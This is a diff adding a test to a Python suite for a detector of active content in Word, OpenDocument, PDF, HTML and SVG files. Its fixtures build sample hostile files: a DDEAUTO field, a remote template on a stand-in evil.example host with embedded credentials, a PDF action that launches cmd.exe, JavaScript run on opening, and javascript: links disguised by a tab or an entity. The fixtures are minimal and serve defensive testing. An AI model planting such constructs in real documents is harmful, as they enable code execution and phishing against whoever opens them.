@@ -1149,6 +1149,171 @@ def check_sourcestrip():
     ]
 
 
+def check_activecontent():
+    """lib/activecontent.py, what a file can do besides be read: a Word
+    file's macros, an outside template, a DDE field, and an OLE object
+    found, a chart's workbook accepted, a plain link not counted; an
+    OpenDocument file's Basic module and event listener found, a chart
+    object and the library's own lists accepted; a PDF's JavaScript on
+    opening, its attached file, and its launch action found, a link and
+    a go-to on opening not; a page's script, handler, a javascript:
+    address hidden by a tab and an entity, a frame, and a form found;
+    an SVG's script, foreignObject, animation that sets a link, and
+    declared entities found; an old Word file named; a plain page, a
+    plain Word file, and a plain PDF finding nothing; and random bytes
+    never a traceback."""
+    import random
+    import tempfile
+    import zipfile
+    import activecontent
+    import pikepdf
+    folder = tempfile.mkdtemp()
+
+    def path(name):
+        return os.path.join(folder, name)
+
+    def office(name, parts):
+        with zipfile.ZipFile(path(name), "w") as z:
+            for member, data in parts.items():
+                z.writestr(member, data)
+        return path(name)
+    rel = ('<Relationship Id="{0}" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+           'relationships/{1}" Target="{2}"{3}/>')
+    rels = lambda *items: ('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
+                           'relationships">' + "".join(items) + "</Relationships>")
+    word = office("macro.docm", {
+        "[Content_Types].xml": '<Types><Default ContentType="application/vnd.ms-word.document.'
+                               'macroEnabled.main+xml"/></Types>',
+        "word/vbaProject.bin": b"\xd0\xcf\x11\xe0",
+        "word/document.xml": '<w:document><w:body><w:p><w:r><w:instrText> DDEAUTO c:\\\\x '
+                             '</w:instrText></w:r></w:p></w:body></w:document>',
+        "word/_rels/document.xml.rels": rels(
+            rel.format("rId1", "hyperlink", "https://example.org/", ' TargetMode="External"'),
+            rel.format("rId2", "oleObject", "embeddings/oleObject1.bin", ""),
+            rel.format("rId3", "chart", "charts/chart1.xml", "")),
+        "word/settings.xml": "<w:settings/>",
+        "word/_rels/settings.xml.rels": rels(rel.format(
+            "rId1", "attachedTemplate", "https://u:p@evil.example/t.dotm?x=1",
+            ' TargetMode="External"')),
+        "word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0",
+        "word/charts/chart1.xml": "<c:chartSpace/>",
+        "word/charts/_rels/chart1.xml.rels": rels(rel.format(
+            "rId1", "package", "../embeddings/Microsoft_Excel_Worksheet.xlsx", "")),
+        "word/embeddings/Microsoft_Excel_Worksheet.xlsx": b"PK",
+    })
+    plain_word = office("plain.docx", {
+        "[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>",
+        "word/_rels/document.xml.rels": rels(rel.format(
+            "rId1", "hyperlink", "https://example.org/", ' TargetMode="External"'))})
+    open_doc = office("events.odt", {
+        "mimetype": "application/vnd.oasis.opendocument.text",
+        "META-INF/manifest.xml": '<manifest:manifest><manifest:file-entry manifest:full-path="'
+                                 'Object 1/" manifest:media-type="application/vnd.oasis.'
+                                 'opendocument.chart"/></manifest:manifest>',
+        "content.xml": '<office:document-content><office:event-listeners><script:event-listener '
+                       'script:event-name="dom:load"/></office:event-listeners>'
+                       '</office:document-content>',
+        "Basic/script-lc.xml": "<library:libraries/>",
+        "Basic/Standard/script-lb.xml": "<library:library/>",
+        "Basic/Standard/Module1.xml": "<script:module>Sub Main</script:module>",
+        "Object 1/content.xml": "<office:document-content/>",
+    })
+    actions = pikepdf.new()
+    actions.add_blank_page()
+    actions.Root.OpenAction = pikepdf.Dictionary({"/S": pikepdf.Name("/JavaScript"),
+                                                  "/JS": pikepdf.String("app.alert(1)")})
+    actions.Root.Names = pikepdf.Dictionary({"/EmbeddedFiles": pikepdf.Dictionary(
+        {"/Names": pikepdf.Array([])})})
+    actions.pages[0].obj.Annots = actions.make_indirect(pikepdf.Array([actions.make_indirect(
+        pikepdf.Dictionary({"/Type": pikepdf.Name("/Annot"), "/Subtype": pikepdf.Name("/Link"),
+                            "/Rect": [0, 0, 10, 10], "/A": pikepdf.Dictionary(
+                                {"/S": pikepdf.Name("/Launch"),
+                                 "/F": pikepdf.String("cmd.exe")})}))]))
+    actions.save(path("actions.pdf"))
+    plain_pdf = pikepdf.new()
+    plain_pdf.add_blank_page()
+    plain_pdf.Root.OpenAction = pikepdf.Array([plain_pdf.pages[0].obj, pikepdf.Name("/Fit")])
+    plain_pdf.pages[0].obj.Annots = plain_pdf.make_indirect(pikepdf.Array([
+        plain_pdf.make_indirect(pikepdf.Dictionary({
+            "/Type": pikepdf.Name("/Annot"), "/Subtype": pikepdf.Name("/Link"),
+            "/Rect": [0, 0, 10, 10], "/A": pikepdf.Dictionary(
+                {"/S": pikepdf.Name("/URI"), "/URI": pikepdf.String("https://example.org/")})}))]))
+    plain_pdf.save(path("plain.pdf"))
+    with open(path("page.html"), "w", encoding="utf-8") as fh:
+        fh.write('<html><body><script src="https://cdn.example/x.js?k=1"></script>'
+                 '<p onclick="go()">Hi</p><a href="jav\tascript:go()">a</a>'
+                 '<a href="&#106;avascript:go()">b</a><iframe src="https://example.org/"></iframe>'
+                 '<form action="https://example.org/post"></form><a href="https://ok.org/">ok</a>'
+                 "</body></html>")
+    with open(path("plain.html"), "w", encoding="utf-8") as fh:
+        fh.write('<html><body><p>Text <a href="https://ok.org/">a link</a>.</p></body></html>')
+    with open(path("drawing.svg"), "w", encoding="utf-8") as fh:
+        fh.write('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "&#60;script&#62;">]>'
+                 '<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[alert(1)]]></script>'
+                 '<foreignObject><div/></foreignObject><a><set attributeName="href" '
+                 'to="javascript:alert(1)"/><circle r="5"/></a></svg>')
+    with open(path("old.doc"), "wb") as fh:
+        fh.write(activecontent.OLE + b"\x00" * 504)
+    by = lambda name: {what: count for _i, what, count, _e in activecontent.check(path(name))}
+    example = lambda name, what: next(e for _i, w, _c, e in activecontent.check(path(name))
+                                      if w == what)
+
+    def fuzzed():
+        # qpdf's warnings of a damaged PDF, which pikepdf logs, aren't
+        # this check's.
+        import logging
+        logger = logging.getLogger("pikepdf")
+        level = logger.level
+        logger.setLevel(logging.CRITICAL)
+        try:
+            return fuzz()
+        finally:
+            logger.setLevel(level)
+
+    def fuzz():
+        rng = random.Random(11)
+        seeds = [open(path(n), "rb").read() for n in ("macro.docm", "events.odt", "actions.pdf",
+                                                      "page.html", "drawing.svg")]
+        names = ["f.docm", "f.odt", "f.pdf", "f.html", "f.svg"]
+        for turn in range(1500):
+            data = bytearray(seeds[turn % 5])
+            for _ in range(rng.randrange(1, 10)):
+                data[rng.randrange(len(data))] = rng.randrange(256)
+            with open(path(names[turn % 5]), "wb") as fh:
+                fh.write(bytes(data))
+            for _inside, what, _count, _example in activecontent.check(path(names[turn % 5])):
+                assert isinstance(what, str)
+        return True
+    return [
+        ("a Word file's macros, outside template, DDE field, and OLE object found, its chart's "
+         "workbook and plain link not",
+         lambda: by("macro.docm") == {"macros": 2, "field DDEAUTO": 1,
+                                      "outside attachedTemplate": 1, "embedded objects": 1}
+         and example("macro.docm", "outside attachedTemplate") == "https://evil.example/t.dotm"
+         and example("macro.docm", "embedded objects") == "word/embeddings/oleObject1.bin"),
+        ("an OpenDocument file's module and event listener found, a chart and the library's "
+         "lists not", lambda: by("events.odt") == {"macros": 1, "event listeners": 1}),
+        ("a PDF's script on opening, attached file, and launch action found",
+         lambda: by("actions.pdf") == {"an action on opening": 1, "attached files": 1,
+                                       "JavaScript actions": 1, "Launch actions": 1}),
+        ("a page's script, handler, hidden javascript: addresses, frame, and form found",
+         lambda: by("page.html") == {"scripts": 1, "event handlers": 1, "script addresses": 2,
+                                     "embedded iframe elements": 1, "forms": 1}
+         and example("page.html", "scripts") == "https://cdn.example/x.js"),
+        ("an SVG's script, foreignObject, link set by an animation, and entities found",
+         lambda: by("drawing.svg") == {
+             "declared entities, which can hold markup no tag shows": 1, "scripts": 1,
+             "foreignObject elements, which can hold a page's markup": 1,
+             "animations that set a link": 1, "script addresses": 1}),
+        ("an old Word file named as one the check can't read",
+         lambda: list(by("old.doc")) == ["an old binary Office file, which this check can't "
+                                         "read"]),
+        ("a plain page, Word file, and PDF finding nothing",
+         lambda: by("plain.html") == {} and by("plain.docx") == {} and by("plain.pdf") == {}),
+        ("random bytes in each kind never a traceback", fuzzed),
+    ]
+
+
 def check_metastrip():
     """lib/metastrip.py, what a picture's file says of its people taken out:
     a JPEG's EXIF filtered to the keep list (the orientation, resolution,
@@ -14237,6 +14402,7 @@ GROUPS = [
     ("lib/metastrip.py, a picture's metadata taken out", check_metastrip),
     ("lib/zonemarks.py, Windows' marks of a download read", check_zonemarks),
     ("lib/sourcestrip.py, a part's own files stripped", check_sourcestrip),
+    ("lib/activecontent.py, what a file can do besides be read", check_activecontent),
     ("lib/limits.py, what each program a run starts may use", check_limits),
     ("what a file is by its first bytes, and whether its name says so", check_filekinds),
     ("a key the book alone sets, in a section a target sets too", check_book_level_keys),
